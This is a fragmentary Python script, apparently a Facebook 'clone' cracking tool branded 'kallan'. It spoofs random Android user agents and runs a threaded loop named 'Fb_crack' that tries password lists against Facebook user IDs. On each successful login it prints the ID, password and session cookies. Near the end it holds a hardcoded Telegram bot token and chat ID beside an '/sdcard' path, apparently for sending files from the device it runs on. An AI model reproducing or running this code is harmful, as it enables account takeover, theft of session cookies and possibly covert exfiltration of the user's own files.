...
for ua in range(5000):
	...
	c=f'Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝    
\033[1;91m╔═════════════════════════╗
\033[1;92m  walcam I'm kallan 🥵= ᏙᎬᎡՏᏆϴΝ = 7.7
\033[1;91m╚═════════════════════════╝
""") 
...
def Alhaj():
    ...
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ OF free fire I'd clone 🥵🥵   \033[1;36m║")
    print("\033[1;96m ╠═════════════════════════════════╣")
...
def Alhajs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m amikallan🥵 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
...
def Alhajm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'User-Agent': ua_string,
...
'X-FB-HTTP-Engine': 'Liger'}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mkallan-vai-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[kallan-vai-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
        ...
        pass
    bot_token = '7039764933:AAFNG0Y5j-LNAp8OLqF7b2L6H2byqZagTuI' 
    chat_id = '6806937114'
    try:
        sdcard_path = '/sdcard'
